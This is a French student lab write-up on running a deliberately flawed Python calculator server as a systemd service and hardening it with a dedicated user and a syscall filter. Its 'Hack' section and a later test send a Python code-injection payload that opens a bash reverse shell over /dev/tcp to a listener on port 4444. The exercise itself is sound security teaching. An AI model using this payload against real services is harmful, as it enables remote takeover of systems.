# Part IV : My shitty app

**Je vous file [une application Python (toute pourrie) codée avec mes mains](./calc.py) :**

- elle écoute sur un port TCP
- un client peut se connecter (genre avec `nc`)
- le client peut soumettre une opération arithmétique
- l'application calcule le résultat et l'envoie au client
- l'application se termine

> J'ai dév un truc vite fait, j'trouve ça cool d'avoir un truc simpliste de quelques lignes, facilement compréhensible !

![Shit python](./img/shit.png)

➜ **Le but de cette partie va être de :**

- prendre la maîtrise sur l'application `calc.py`, en la lançant à la main
- l'utiliser, s'y connecter en tant que client
- créer un service `calculatrice.service` qui lance l'app `calc.py` pour un hébergement propre
- harden le service !

➜ **Il vous faudra `nc` sur votre PC**

- `nc` c'est pour netcat (dispo sur tous les OS)
- un outil qui permet de se connecter de façon arbitraire à un port TCP
- utile pour tester des trucs à la main
- ou se connecter à des services simplistes comme celui-ci

## 1. Test

D'abord, on test l'app, on prend la maîtrise dessus : vous récupérez [mon ptit code](./calc.py) dans votre VM, vous le lancez à la main, vous vous y connectez pour voir comment ça fonctionne.

🌞 **Téléchargez l'app Python dans votre VM**

```sh
[gwuill@vbox ~]$ ls /opt/
calc.py
```

🌞 **Lancer l'application dans votre VM**

```sh
gwuill@Gwuill:~$ nc 192.168.56.10 13337
Hello3+3
6Hello
```
## 2. Création de service

🌞 **Créer un service `calculatrice.service`**

```sh
[gwuill@vbox ~]$ sudo cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super serveur calculatrice

[Service]
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always
```

🌞 **Vérifier que ce nouveau service est bien reconnu***

```sh
[gwuill@vbox ~]$ sudo systemctl status calculatrice
○ calculatrice.service - Super serveur calculatrice
     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
     Active: inactive (dead)
```

🌞 **Vous devez pouvoir utiliser l'application normalement :**

```sh
[gwuill@vbox ~]$ sudo systemctl status calculatrice
● calculatrice.service - Super serveur calculatrice
     Loaded: loaded (/etc/systemd/system/calculatrice.service; static)
     Active: active (running) since Thu 2025-03-13 16:05:52 CET; 1s ago
   Main PID: 4873 (python3)
      Tasks: 1 (limit: 4650)
     Memory: 3.3M
        CPU: 13ms
     CGroup: /system.slice/calculatrice.service
             └─4873 /usr/bin/python3 /opt/calc.py

Mar 13 16:05:52 vbox systemd[1]: Started Super serveur calculatrice.
```

## 3. Hack

🌞 **Hack l'application**

```sh
gwuill@Gwuill:~$ nc 192.168.56.10 13337
Hello__import__('subprocess').getoutput('bash -i >& /dev/tcp/192.168.56.1/4444 0>&1')
```

## 4. Harden

### A. Utilisateurs

On va commencer par gérer correctement l'identité sous laquelle s'exécute le serveur calculatrice.

Si on précise rien dans un `.service`, ça s'exécute en `root` par défaut.

On va donc créer un utilisateur dédié, qui possède le strict nécessaire, et on le définira dans le `.service` pour qu'il lance notre application Python.

🌞 **Prouvez que le service s'exécute actuellement en `root`**

```sh
[gwuill@vbox ~]$ ps -aux | grep calc
root        4873  0.0  1.1  11596  9344 ?        Ss   16:05   0:00 /usr/bin/python3 /opt/calc.py
```

🌞 **Créer l'utilisateur `calculatrice`**

```sh
[gwuill@vbox ~]$ sudo useradd -s /usr/sbin/nologin -M calculatrice
```

🌞 **Adaptez les permissions**

```sh
[gwuill@vbox opt]$ ls -la
total 4
drwxr-xr-x.  2 root         root          21 Mar 13 15:28 .
dr-xr-xr-x. 18 root         root         235 Feb 20 08:55 ..
-r--------.  1 calculatrice calculatrice 659 Mar 13 15:23 calc.py
```

🌞 **Modifier le `.service`**

```sh
[gwuill@vbox opt]$ sudo cat /etc/systemd/system/calculatrice.service
[Unit]
Description=Super serveur calculatrice

[Service]
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always
User=calculatrice

[gwuill@vbox ~]$ sudo systemctl daemon-reload
```

🌞 **Prouvez que le service s'exécute désormais en tant que `calculatrice`**

```sh
[gwuill@vbox ~]$ ps -aux | grep cal
calcula+    4979  0.0  1.0  10824  8192 ?        Ss   16:16   0:00 /usr/bin/python3 /opt/calc.py
```

### B. Syscalls

Bon bah ouais on revient au thème du TP, vous le voyez venir :D

🌞 **Tracez l'exécution de l'application : normal**

```sh
[gwuill@vbox ~]$ sudo sysdig -r normal.scap | cut -d' ' -f7 | sort | uniq | tr -s '\n' ' '
accept4 access arch_prctl bind brk close dup epoll_create1 execve exit_group fcntl fstat futex getdents64 getegid geteuid getgid getpeername getrandom getsockname getuid ioctl listen lseek mmap mprotect munmap newfstatat openat pread prlimit procexit read readlink recvfrom rseq rt_sigaction sendto set_robust_list setsockopt set_tid_address signaldeliver socket switch sysinfo write
```
🌞 **Tracez l'exécution de l'application : hack**

```sh
[gwuill@vbox ~]$ sudo sysdig -r hack.scap | cut -d' ' -f7 | sort | uniq | tr -s '\n' ' '
accept4 access arch_prctl bind brk clone close dup dup2 epoll_create1 execve fcntl fstat futex getdents64 getegid geteuid getgid getrandom getsockname gettid getuid ioctl listen lseek mmap mprotect munmap newfstatat openat pipe2 pread prlimit procexit read readlink recvfrom rseq rt_sigaction sendto set_robust_list setsockopt set_tid_address signaldeliver socket switch sysinfo
```


🌞 **Adaptez le `.service`**

```sh
[gwuill@vbox ~]$ sudo cat /etc/systemd/system/calculatrice.service
*[Unit]
Description=Super serveur calculatrice

[Service]
ExecStart=/usr/bin/python3 /opt/calc.py
Restart=always
User=calculatrice
SystemCallFilter=accept4 access arch_prctl bind brk close dup epoll_create1 execve exit_group fcntl fstat futex getdents64 getegid geteuid getgid getpeername getrandom getsockname getuid ioctl listen lseek mmap mprotect munmap newfstatat openat pread64 prlimit64 read readlink recvfrom rseq rt_sigaction sendto set_robust_list setsockopt set_tid_address socket sysinfo write
```

```sh
gwuill@Gwuill:~$ nc 192.168.56.10 13337
Hello__import__('subprocess').getoutput('bash -i >& /dev/tcp/192.168.56.1/4444 0>&1') 

bash-5.1$ gwuill@Gwuill:~$ nc -l -v -p 4444
listening on [any] 4444 ...
```


![Fork](./img/fork.png)
